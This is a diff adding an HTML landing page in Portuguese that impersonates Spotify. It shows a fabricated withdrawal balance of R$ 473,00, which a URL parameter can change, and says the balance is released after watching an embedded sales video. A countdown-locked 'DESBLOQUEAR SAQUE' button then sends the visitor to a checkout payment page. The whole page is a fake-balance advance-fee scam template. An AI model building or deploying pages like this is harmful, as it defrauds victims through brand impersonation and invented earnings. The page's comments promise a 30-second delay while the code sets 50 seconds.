@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+
+<link rel="preload" href="https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9e9a08b434c3ece7b1537/v4/embed.html">
+<script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+<link rel="preload" href="https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9e9a08b434c3ece7b1537/v4/player.js" as="script">
+<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+<link rel="preload" href="https://cdn.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/68c9e97a8b434c3ece7b14ff/main.m3u8" as="fetch">
+<link rel="dns-prefetch" href="https://cdn.converteai.net">
+<link rel="dns-prefetch" href="https://scripts.converteai.net">
+<link rel="dns-prefetch" href="https://images.converteai.net">
+<link rel="dns-prefetch" href="https://api.vturb.com.br">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Desbloqueio de Saldo</title>
+<style>
+  :root{
+    --green:#1db954;
+    --dark:#0f8a3e;
+    --text:#2b3a47;
+    --muted:#5f6e7a;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Arial,Helvetica,sans-serif;color:var(--text);background:#fff}
+  /* faixa superior */
+  .top-strip{
+    background:var(--green);
+    color:#fff;
+    font-weight:800;
+    letter-spacing:.5px;
+    text-transform:uppercase;
+    text-align:center;
+    padding:14px 10px;
+    font-size:18px;
+  }
+  /* container central */
+  .wrap{
+    max-width:760px;
+    margin:26px auto 60px;
+    padding:0 16px;
+  }
+  .header{
+    display:flex;align-items:center;justify-content:space-between;gap:12px;
+  }
+  .logo{height:28px}
+  .saldo-chip{
+    display:inline-flex;align-items:center;gap:10px;
+    border:2px solid #dfe8e3;border-radius:10px;padding:10px 14px;
+    font-weight:800;color:var(--text);background:#fff;
+    box-shadow:0 3px 10px rgba(0,0,0,.06);
+  }
+  .saldo-chip small{display:block;font-size:11px;color:#6d7a86;font-weight:700;text-transform:uppercase;letter-spacing:.6px;text-align:center}
+  .saldo-chip b{display:block;color:var(--green);font-size:18px}
+  .divider{height:2px;background:#e9eef1;margin:18px 0}
+  h1{
+    color:var(--green);
+    text-transform:uppercase;
+    font-size:24px;
+    text-align:center;
+    margin:8px 0 6px;
+  }
+  .sub{
+    text-align:center;color:#2d3b46;max-width:540px;margin:0 auto 16px;font-size:18px;line-height:1.35;
+  }
+  /* vídeo */
+  #videoWrap{
+    width:100%;max-width:600px;margin:0 auto 22px;border-radius:6px;overflow:hidden;
+    box-shadow:0 10px 25px rgba(0,0,0,.12);
+  }
+  /* botão */
+  .cta{
+    display:block;width:100%;max-width:420px;margin:14px auto 0;
+    background:var(--green);color:#fff;border:none;border-radius:8px;
+    padding:16px 22px;font-weight:800;font-size:16px;cursor:pointer;
+    transition:filter .2s ease,transform .02s ease;
+  }
+  .cta:active{transform: translateY(1px)}
+  .cta[disabled]{
+    opacity:.55;cursor:not-allowed;filter:grayscale(30%);
+  }
+  /* rodapé sutil opcional */
+  .note{
+    text-align:center;color:#8a98a4;font-size:12px;margin-top:12px;
+  }
+
+  /* responsivo leve */
+  @media (max-width:520px){
+    .top-strip{font-size:14px;padding:12px 8px}
+    .saldo-chip{padding:8px 10px}
+    .saldo-chip b{font-size:16px}
+  }
+</style>
+</head>
+<body>
+
+<div class="top-strip">ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.</div>
+
+<div class="wrap">
+  <div class="header">
+    <img class="logo" src="logo.png" alt="Spotify">
+    <div class="saldo-chip">
+      <div>
+        <small>SALDO</small>
+        <b id="saldoValor">R$ 473,00</b>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <h1>Desbloqueio de saldo</h1>
+  <p class="sub">Veja como liberar seu saque assistindo ao vídeo.</p>
+
+  <!-- SDK do Smartplayer -->
+<script type="text/javascript">
+  var s = document.createElement("script");
+  s.src = "https://scripts.converteai.net/lib/js/smartplayer-wc/v4/sdk.js";
+  s.async = true;
+  document.head.appendChild(s);
+</script>
+
+<!-- Container do player -->
+<div id="ifr_68c9e9a08b434c3ece7b1537_wrapper" style="margin: 0 auto; width: 100%; max-width: 400px;">
+  <div style="position: relative; padding: 177.77% 0 0 0;" id="ifr_68c9e9a08b434c3ece7b1537_aspect">
+    <iframe
+      frameborder="0"
+      allowfullscreen
+      src="about:blank"
+      id="ifr_68c9e9a08b434c3ece7b1537"
+      style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
+      referrerpolicy="origin"
+      onload="this.onload=null; this.src='https://scripts.converteai.net/80a6a49a-7ebf-469d-993e-79d7f30f1366/players/68c9e9a08b434c3ece7b1537/v4/embed.html' + (location.search || '?') + '&vl=' + encodeURIComponent(location.href)">
+    </iframe>
+  </div>
+</div>
+
+
+  <!-- BOTÃO COM DELAY -->
+  <button id="cta" class="cta" disabled>DESBLOQUEAR SAQUE (aguarde 30s)</button>
+  <div class="note" id="countNote">O botão será liberado após 30 segundos de exibição.</div>
+</div>
+
+<script>
+  // ======= CONFIG =======
+  // Troque pelo link real do checkout
+  const CHECKOUT_URL = "https://seu-checkout-aqui.com/pagar";
+  // Permite passar o saldo via URL ?saldo=47300 (em centavos) ou ?saldo=473.00
+  const saldoLabel = document.getElementById('saldoValor');
+  (function setSaldoFromQuery(){
+    const q = new URLSearchParams(location.search);
+    if(!q.has('saldo')) return;
+    let v = q.get('saldo');
+    let num = Number(v.toString().replace('.',',').replace(/[^\d,]/g,'').replace(',','.'));
+    if(!isNaN(num) && num>0){
+      saldoLabel.textContent = num.toLocaleString('pt-BR',{style:'currency',currency:'BRL'});
+    }
+  })();
+
+  // ======= DELAY DO BOTÃO (30s) =======
+  const cta = document.getElementById('cta');
+  const note = document.getElementById('countNote');
+  const DELAY_MS = 50000;
+  let remaining = Math.ceil(DELAY_MS/1000);
+  let tick;
+
+  function startCountdown(){
+    updateLabel();
+    tick = setInterval(()=>{
+      remaining--;
+      updateLabel();
+      if(remaining<=0){
+        clearInterval(tick);
+        liberarBotao();
+      }
+    },1000);
+  }
+
+  function updateLabel(){
+    if(remaining>0){
+      cta.textContent = `DESBLOQUEAR SAQUE (aguarde ${remaining}s)`;
+      note.textContent = `O botão será liberado após ${remaining}s.`;
+    }
+  }
+
+  function liberarBotao(){
+    cta.disabled = false;
+    cta.textContent = "DESBLOQUEAR SAQUE";
+    note.textContent = "Botão liberado.";
+  }
+
+  // Libera após 30s a partir do carregamento da página
+  startCountdown();
+
+  // Clique → checkout
+  cta.addEventListener('click', ()=>{
+    if(cta.disabled) return;
+    window.location.href = CHECKOUT_URL;
+  });
+
+  // OPCIONAL: se quiser liberar assim que o vídeo chegar a 30s de play real:
+  // Descomente abaixo e comente a chamada startCountdown() acima.
+  /*
+  const player = document.getElementById('videoDemo'); // troque pelo player do vturb se quiser
+  let unlocked = false;
+  player.addEventListener('timeupdate', ()=>{
+    if(!unlocked && player.currentTime >= 30){
+      unlocked = true;
+      liberarBotao();
+    }else if(!unlocked){
+      remaining = Math.max(0, 30 - Math.floor(player.currentTime));
+      updateLabel();
+    }
+  });
+  */
+</script>
+
+</body>
+</html>
